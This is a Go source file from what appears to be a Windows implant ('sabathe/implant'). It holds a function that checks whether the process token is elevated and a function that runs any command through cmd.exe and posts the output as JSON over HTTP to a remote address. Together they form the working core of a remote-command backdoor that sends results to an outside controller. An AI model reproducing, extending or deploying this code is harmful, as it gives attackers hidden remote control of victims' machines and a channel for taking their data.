package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"net/http"
	"os/exec"
	"sabathe/implant/config"
	"syscall"
	"unsafe"
)

func IsHighPriv() bool {
	token, err := syscall.OpenCurrentProcessToken()
	defer token.Close()
	if err != nil {
		fmt.Printf("open current process token failed: %v\n", err)
		return false
	}
	/*
		ref:
		C version https://vimalshekar.github.io/codesamples/Checking-If-Admin
		Go package https://github.com/golang/sys/blob/master/windows/security_windows.go ---> IsElevated
		maybe future will use ---> golang/x/sys/windows
	*/
	var isElevated uint32
	var outLen uint32
	err = syscall.GetTokenInformation(token, syscall.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &outLen)
	if err != nil {
		return false
	}
	return outLen == uint32(unsafe.Sizeof(isElevated)) && isElevated != 0
}

func ExecuteCmd(cmd string, address string) {
	c := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmd)
	cmdout, _ := c.CombinedOutput()
	fmt.Println(cmdout)
	tmp, err := simplifiedchinese.GB18030.NewDecoder().Bytes(cmdout)
	if err != nil {
		fmt.Println(err)
		return
	}
	msg := &config.Response{
		Body: tmp,
	}

	message, err := json.Marshal(msg)
	if err != nil {
		return
	}
	_, err = http.Post(fmt.Sprintf("http://%v", address), "application/x-www-form-urlencoded", bytes.NewReader(message))
	if err != nil {
		fmt.Println(err)
	}
}
